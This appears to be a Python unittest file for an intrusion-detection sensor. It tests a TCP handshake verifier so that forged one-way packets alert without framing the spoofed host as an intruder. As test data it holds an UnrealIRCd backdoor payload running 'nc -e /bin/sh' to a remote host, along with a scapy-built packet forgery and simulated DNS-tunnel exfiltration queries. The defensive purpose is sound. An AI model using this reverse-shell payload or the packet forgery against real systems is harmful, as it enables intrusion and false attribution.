"""An innocent host must not be framable with forged packets: 2026-10-31 audit, step 4.

Reproduced before this change (scratchpad poc_frame.py): 41 one-way packets,
every one carrying the VICTIM's address as source - an UnrealIRCd trigger and
DNS-tunnel queries - raised a critical ACTIVE_INTRUSION naming the victim. The
playbook for that alert says isolate the host. The attacker never completed a
handshake and never received a byte.

What a forger off the path cannot do: learn the real server's initial sequence
number. The real SYN-ACK goes to the victim (whose stack answers it with a RST);
so a payload that acknowledges the server's sequence number is evidence the
claimed client really holds the connection.

The contract:
  * an exploit payload on a connection that verifies is attributed as before
    (detection and escalation unchanged for real attacks)
  * one that does not verify still ALERTS - with the reason - but is not
    attributed: it never puts that address into an incident
  * the sensor starting mid-connection costs escalation, never the alert
"""

import contextlib
import io
import os
import shutil
import tempfile
import unittest

try:
    import scapy.all  # noqa: F401
    SCAPY = True
except ImportError:                                   # pragma: no cover
    SCAPY = False

SYN, ACK, RST, PSH = 0x02, 0x10, 0x04, 0x08
VICTIM, SERVER = "192.168.56.20", "192.168.56.102"
UNREAL = b"AB; nc -e /bin/sh 203.0.113.66 4444\n"


class TestHandshakeVerifier(unittest.TestCase):
    def v(self):
        from detection.handshake import HandshakeVerifier
        return HandshakeVerifier()

    def real(self, h, c_isn=1000, s_isn=900000):
        h.observe(VICTIM, SERVER, 40001, 6667, SYN, seq=c_isn, ack=0)
        h.observe(SERVER, VICTIM, 6667, 40001, SYN | ACK, seq=s_isn, ack=c_isn + 1)
        h.observe(VICTIM, SERVER, 40001, 6667, ACK, seq=c_isn + 1, ack=s_isn + 1)
        return s_isn

    def test_real_connection_verifies(self):
        h = self.v()
        s_isn = self.real(h)
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=s_isn + 1)
        self.assertTrue(ok, why)

    def test_server_side_payload_verifies_too(self):
        h = self.v()
        self.real(h, c_isn=1000)
        ok, why = h.verify(SERVER, VICTIM, 6667, 40001, ack=1001 + 37)
        self.assertTrue(ok, why)

    def test_no_handshake_does_not_verify(self):
        ok, why = self.v().verify(VICTIM, SERVER, 40001, 6667, ack=12345)
        self.assertFalse(ok)
        self.assertIn("handshake", why)

    def test_server_never_answered(self):
        h = self.v()
        h.observe(VICTIM, SERVER, 40001, 6667, SYN, seq=1000, ack=0)
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=1)
        self.assertFalse(ok)
        self.assertIn("never answered", why)

    def test_guessed_acknowledgement_does_not_verify(self):
        """The forger did not see the real SYN-ACK, so its ACK number is a guess."""
        h = self.v()
        s_isn = self.real(h)
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=(s_isn + 2**30) % 2**32)
        self.assertFalse(ok)
        self.assertIn("acknowledg", why)

    def test_two_different_synacks_is_a_forgery_tell(self):
        h = self.v()
        h.observe(VICTIM, SERVER, 40001, 6667, SYN, seq=1000, ack=0)
        h.observe(SERVER, VICTIM, 6667, 40001, SYN | ACK, seq=555, ack=1001)    # forged
        h.observe(SERVER, VICTIM, 6667, 40001, SYN | ACK, seq=900000, ack=1001)  # real
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=556)
        self.assertFalse(ok)
        self.assertIn("SYN-ACK", why)

    def test_retransmitted_synack_is_fine(self):
        h = self.v()
        h.observe(VICTIM, SERVER, 40001, 6667, SYN, seq=1000, ack=0)
        h.observe(SERVER, VICTIM, 6667, 40001, SYN | ACK, seq=900000, ack=1001)
        h.observe(SERVER, VICTIM, 6667, 40001, SYN | ACK, seq=900000, ack=1001)
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=900001)
        self.assertTrue(ok, why)

    def test_claimed_client_reset_it(self):
        """The victim's stack RSTs a SYN-ACK for a SYN it never sent."""
        h = self.v()
        h.observe(VICTIM, SERVER, 40001, 6667, SYN, seq=1000, ack=0)
        h.observe(SERVER, VICTIM, 6667, 40001, SYN | ACK, seq=900000, ack=1001)
        h.observe(VICTIM, SERVER, 40001, 6667, RST, seq=1001, ack=0)
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=900001)
        self.assertFalse(ok)
        self.assertIn("reset", why)

    def test_sequence_wraparound(self):
        h = self.v()
        s_isn = self.real(h, s_isn=2**32 - 10)
        ok, why = h.verify(VICTIM, SERVER, 40001, 6667, ack=(s_isn + 1 + 500) % 2**32)
        self.assertTrue(ok, why)

    def test_unknown_ack_does_not_verify(self):
        h = self.v()
        self.real(h)
        ok, _ = h.verify(VICTIM, SERVER, 40001, 6667, ack=None)
        self.assertFalse(ok)

    def test_bounded(self):
        from detection.handshake import HandshakeVerifier
        h = HandshakeVerifier(max_flows=100)
        for i in range(1000):
            h.observe(f"10.0.{i // 250}.{i % 250}", SERVER, 1024 + i, 80, SYN, seq=i, ack=0)
        self.assertLessEqual(len(h), 100)


class _PipelineCase(unittest.TestCase):
    def setUp(self):
        from detection.pipeline import DetectionPipeline
        self.p = DetectionPipeline()

    def rules(self):
        return [a["rule_id"] for a in self.p.published]

    def alert(self, rule_id):
        return next(a for a in self.p.published if a["rule_id"] == rule_id)

    def post_access_from_victim(self, t0):
        """A post-access stage attributed to the victim, injected the way any
        sensor-side finding is: straight into correlation."""
        from detection.findings import Finding
        self.p.publish(Finding(rule_id="EXFIL_DNS_TUNNEL", src=VICTIM, dst="8.8.8.8",
                               protocol="UDP", ts=t0 + 5, message="tunnel"))


class TestForgedExploitIsNotAttributed(_PipelineCase):
    def test_one_way_forgery_alerts_but_does_not_frame(self):
        self.p.on_tcp_packet(VICTIM, SERVER, 40001, 6667, PSH | ACK, payload=UNREAL,
                             ts=100.0, seq=101, ack_num=501)
        self.post_access_from_victim(100.0)
        self.assertIn("EXPLOIT_UNREALIRCD_BACKDOOR", self.rules(), "detection lost")
        self.assertNotIn("ACTIVE_INTRUSION", self.rules(), "victim framed")
        a = self.alert("EXPLOIT_UNREALIRCD_BACKDOOR")
        self.assertIs(a["details"]["source_verified"], False)
        self.assertIn("handshake", a["details"]["source_check"])

    def test_forged_handshake_with_guessed_ack_does_not_frame(self):
        """Attacker forges SYN and SYN-ACK; the real server's SYN-ACK also
        crosses the sensor. The payload acks the forged ISN."""
        p = self.p
        p.on_tcp_packet(VICTIM, SERVER, 40001, 6667, SYN, ts=100.0, seq=100, ack_num=0)
        p.on_tcp_packet(SERVER, VICTIM, 6667, 40001, SYN | ACK, ts=100.001, seq=500, ack_num=101)
        p.on_tcp_packet(SERVER, VICTIM, 6667, 40001, SYN | ACK, ts=100.002, seq=77777777, ack_num=101)
        p.on_tcp_packet(VICTIM, SERVER, 40001, 6667, PSH | ACK, payload=UNREAL,
                        ts=100.01, seq=101, ack_num=501)
        self.post_access_from_victim(100.0)
        self.assertIn("EXPLOIT_UNREALIRCD_BACKDOOR", self.rules())
        self.assertNotIn("ACTIVE_INTRUSION", self.rules())


class TestRealExploitStillEscalates(_PipelineCase):
    def test_verified_exploit_escalates_as_before(self):
        p = self.p
        p.on_tcp_packet(VICTIM, SERVER, 40001, 6667, SYN, ts=100.0, seq=100, ack_num=0)
        p.on_tcp_packet(SERVER, VICTIM, 6667, 40001, SYN | ACK, ts=100.001, seq=900000, ack_num=101)
        p.on_tcp_packet(VICTIM, SERVER, 40001, 6667, ACK, ts=100.002, seq=101, ack_num=900001)
        p.on_tcp_packet(VICTIM, SERVER, 40001, 6667, PSH | ACK, payload=UNREAL,
                        ts=100.01, seq=101, ack_num=900001)
        self.post_access_from_victim(100.0)
        self.assertIn("ACTIVE_INTRUSION", self.rules())
        self.assertIs(self.alert("EXPLOIT_UNREALIRCD_BACKDOOR")["details"]["source_verified"], True)


@unittest.skipUnless(SCAPY, "scapy required")
class TestTheReproducedFrameIsClosed(unittest.TestCase):
    """The exact PoC, end to end through main.process_packet."""

    def setUp(self):
        import main
        self.main = main
        self.tmp = tempfile.mkdtemp()
        self.saved_db = main.DB_PATH
        main.DB_PATH = main.Path(self.tmp) / "frame.db"
        main.init_db()
        main.PIPELINE.reset()

    def tearDown(self):
        self.main.PIPELINE.reset()
        self.main.DB_PATH = self.saved_db
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_poc_no_longer_frames_the_victim(self):
        from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, Raw
        pkts = [IP(src=VICTIM, dst=SERVER) / TCP(sport=40001, dport=6667, flags="PA",
                                                 seq=101, ack=501) / Raw(UNREAL)]
        for i in range(40):
            label = (f"{i:04x}" + "a1b2c3d4e5f6" * 4)[:60]
            pkts.append(IP(src=VICTIM, dst="8.8.8.8") / UDP(sport=50000 + i, dport=53)
                        / DNS(rd=1, qd=DNSQR(qname=f"{label}.x7.tunnel-example.net")))
        with contextlib.redirect_stdout(io.StringIO()):
            for p in pkts:
                self.main.process_packet(Ether(bytes(Ether() / p)))
        rules = [a["rule_id"] for a in self.main.PIPELINE.published]
        self.assertIn("EXPLOIT_UNREALIRCD_BACKDOOR", rules)
        self.assertNotIn("ACTIVE_INTRUSION", rules)


if __name__ == "__main__":
    unittest.main()
